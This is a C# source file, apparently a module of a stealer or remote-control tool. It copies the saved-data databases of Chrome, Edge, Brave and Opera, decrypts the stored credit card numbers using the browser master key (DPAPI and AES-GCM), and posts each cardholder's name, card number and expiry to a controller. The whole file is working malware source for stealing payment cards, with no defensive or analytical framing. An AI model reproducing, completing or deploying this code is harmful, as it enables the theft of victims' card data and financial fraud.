using System;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using True.Core;
using True.Helpers;

public class BrowserCreditCardExtractor
{
    private static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    private static readonly (string path, string browser)[] Targets =
    {
        (@"Google\Chrome\User Data\Default\Web Data", "Chrome"),
        (@"Microsoft\Edge\User Data\Default\Web Data", "Edge"),
        (@"BraveSoftware\Brave-Browser\User Data\Default\Web Data", "Brave"),
        (@"Opera Software\Opera Stable\Web Data", "Opera")
    };

    public static void Extract()
    {
        var sb = new StringBuilder();

        foreach (var (relativePath, browser) in Targets)
        {
            string fullPath = Path.Combine(LocalAppData, relativePath);
            if (!File.Exists(fullPath))
            {
                Logger.Warn($"[CreditCardExtractor] {browser} Web Data DB not found.");
                continue;
            }

            try
            {
                string tempPath = Path.GetTempFileName();
                File.Copy(fullPath, tempPath, true);

                byte[] masterKey = DPAPIHelper.GetMasterKey(browser);
                if (masterKey == null)
                {
                    Logger.Warn($"[CreditCardExtractor] Could not retrieve master key for {browser}");
                    continue;
                }

                using (var conn = new SQLiteConnection($"Data Source={tempPath};Version=3;"))
                {
                    conn.Open();

                    using (var cmd = new SQLiteCommand("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string name = reader["name_on_card"]?.ToString() ?? "(unknown)";
                            string month = reader["expiration_month"]?.ToString() ?? "--";
                            string year = reader["expiration_year"]?.ToString() ?? "----";
                            byte[] enc = (byte[])reader["card_number_encrypted"];

                            string cardNumber = Decrypt(enc, masterKey);
                            sb.AppendLine($"{browser}|{name}|{cardNumber}|{month}/{year}");
                        }
                    }
                }

                File.Delete(tempPath);
            }
            catch (Exception ex)
            {
                Logger.Error($"[CreditCardExtractor] {browser} failed: {ex.Message}");
            }
        }

        if (sb.Length == 0)
            sb.Append("(no saved credit cards)");

        Communicator.PostResponse("browser_creditcards", sb.ToString().Trim());
    }

    private static string Decrypt(byte[] encryptedData, byte[] masterKey)
    {
        try
        {
            if (encryptedData == null || encryptedData.Length <= 5)
                return "";

            if (encryptedData[0] == 'v' && encryptedData[1] == '1' && encryptedData[2] == '0')
            {
                // AES-GCM with Chrome master key
                byte[] nonce = new byte[12];
                Array.Copy(encryptedData, 3, nonce, 0, 12);
                byte[] ciphertextTag = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, ciphertextTag, 0, ciphertextTag.Length);

                using var aes = new AesGcm(masterKey);
                byte[] plaintext = new byte[ciphertextTag.Length - 16]; // 16-byte tag

                aes.Decrypt(nonce, ciphertextTag.AsSpan(0, ciphertextTag.Length - 16), ciphertextTag.AsSpan(ciphertextTag.Length - 16), plaintext, null);
                return Encoding.UTF8.GetString(plaintext);
            }
            else
            {
                return DPAPIHelper.Decrypt(encryptedData);
            }
        }
        catch
        {
            return "(decryption failed)";
        }
    }
}
